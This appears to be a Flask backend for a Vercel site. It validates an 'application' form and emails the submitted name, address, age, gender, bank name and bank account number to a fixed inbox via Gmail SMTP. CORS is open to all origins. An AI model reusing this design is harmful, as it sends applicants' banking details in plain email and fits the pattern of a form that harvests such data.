# /api/index.py
from flask import Flask, request, jsonify
from flask_cors import CORS
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import smtplib
import re
import os

# --- Flask App Definition for Vercel ---
# Vercel's build process understands this simple setup.
# It will automatically handle serving the static files from the root.
app = Flask(__name__)
CORS(app)

# --- Securely load credentials from Vercel's Environment Variables ---
SENDER_EMAIL = os.environ.get('SENDER_EMAIL')
SENDER_PASSWORD = os.environ.get('SENDER_PASSWORD')
RECEIVER_EMAIL = os.environ.get('RECEIVER_EMAIL')

# --- Validation Functions (No changes needed) ---
def validate_email(email):
    pattern = r'^[^\s@]+@[^\s@]+\.[^\s@]+$'
    return re.match(pattern, email) is not None

def validate_phone(phone):
    pattern = r'^[0-9+\-\s]{7,15}$'
    return re.match(pattern, phone) is not None

def validate_age(age):
    try:
        return int(age) >= 18
    except (ValueError, TypeError):
        return False
# ... (add any of your other specific validation functions if you have them)

def validate_form_data(data):
    errors = []
    required_fields = ['first-name', 'last-name', 'email', 'phone', 'address', 'city-state', 'zipcode', 'gender', 'age', 'bank-name', 'bank-number']
    for field in required_fields:
        if not data.get(field) or not str(data.get(field)).strip():
            errors.append(f"{field.replace('-', ' ').title()} is required.")
    if errors: return errors
    if not validate_email(data.get('email')): errors.append("Invalid email format.")
    if not validate_phone(data.get('phone')): errors.append("Invalid phone number format.")
    if not validate_age(data.get('age')): errors.append("You must be at least 18.")
    return errors

# --- API Endpoint for Form Submission ---
# This is the only route the Flask app needs to handle.
# Vercel handles serving index.html and other static files directly.
@app.route('/sendmail', methods=['POST'])
def send_mail_route():
    try:
        data = request.get_json()
    except Exception:
        return jsonify({"status": "error", "message": "Invalid JSON format"}), 400

    validation_errors = validate_form_data(data)
    if validation_errors:
        return jsonify({"status": "error", "message": " | ".join(validation_errors)}), 400

    # Check if the server-side environment variables are configured
    if not all([SENDER_EMAIL, SENDER_PASSWORD, RECEIVER_EMAIL]):
        print("SERVER ERROR: Email environment variables are not set on Vercel.")
        return jsonify({"status": "error", "message": "Server is not configured to send emails."}), 500

    try:
        subject = "New Application from Your Website"
        body = f"""
You have received a new application with the following details:

--- Personal Information ---
First Name: {data.get('first-name', 'N/A')}
Last Name: {data.get('last-name', 'N/A')}
Email: {data.get('email', 'N/A')}
Phone Number: {data.get('phone', 'N/A')}
Gender: {data.get('gender', 'N/A')}
Age: {data.get('age', 'N/A')}
Occupation: {data.get('occupation', 'N/A')}

--- Address ---
Address: {data.get('address', 'N/A')}
City & State: {data.get('city-state', 'N/A')}
Zipcode: {data.get('zipcode', 'N/A')}

--- Banking ---
Bank Name: {data.get('bank-name', 'N/A')}
Account Number: {data.get('bank-number', 'N/A')}
"""
        msg = MIMEMultipart()
        msg['From'] = SENDER_EMAIL
        msg['To'] = RECEIVER_EMAIL
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain'))

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
            server.login(SENDER_EMAIL, SENDER_PASSWORD)
            server.send_message(msg)

        return jsonify({
            "status": "success",
            "message": "Form sent successfully!",
            "redirect": "/thank_you.html"
        }), 200

    except Exception as e:
        # This will log the actual error to your Vercel logs for debugging
        print(f"---!!! PRODUCTION EMAIL SENDING FAILED !!!---")
        print(f"ERROR TYPE: {type(e).__name__}")
        print(f"ERROR MESSAGE: {e}")
        print("-----------------------------------")
        
        return jsonify({
            "status": "error",
            "message": "An internal error occurred while sending the email."
        }), 500

# NOTE: The if __name__ == '__main__': block and the dotenv imports are removed.
# They are not needed for the Vercel production environment.